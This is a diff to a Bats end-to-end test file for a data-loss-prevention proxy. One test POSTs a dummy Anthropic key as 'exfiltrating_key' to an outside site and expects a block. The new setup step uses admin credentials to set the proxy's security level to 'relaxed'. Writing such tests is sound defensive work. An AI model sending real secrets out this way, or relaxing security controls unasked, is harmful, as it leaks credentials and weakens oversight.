@@ -15,6 +15,16 @@ setup() {
     # Example credentials — use short keys that won't trigger aws_secret false positive
     ANTHROPIC_KEY="sk-ant-api01-abcdefghij1234567890"
     RSA_PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----"
+
+    # Ensure security level is relaxed so non-credential traffic passes through
+    local admin_pass
+    admin_pass="$(grep 'VALKEY_MCP_ADMIN_PASS=' "${PROJECT_ROOT}/secrets/credentials.env.example" 2>/dev/null | cut -d'=' -f2)"
+    if [[ -n "$admin_pass" ]]; then
+        docker exec polis-v2-valkey valkey-cli --tls --cert /etc/valkey/tls/client.crt \
+            --key /etc/valkey/tls/client.key --cacert /etc/valkey/tls/ca.crt \
+            --user mcp-admin --pass "$admin_pass" \
+            SET molis:config:security_level relaxed 2>/dev/null || true
+    fi
 }
 
 @test "e2e-dlp: Anthropic key to api.anthropic.com is ALLOWED" {
@@ -31,7 +41,8 @@ setup() {
         -X POST -d "exfiltrating_key=${ANTHROPIC_KEY}" \
         --connect-timeout 15 https://www.google.com
     assert_output --partial "x-molis-block: true"
-    assert_output --partial "x-molis-reason: credential_detected"
+    # DLP module returns the pattern name as the reason
+    assert_output --partial "x-molis-reason: anthropic"
     assert_output --partial "x-molis-pattern: anthropic"
 }
 
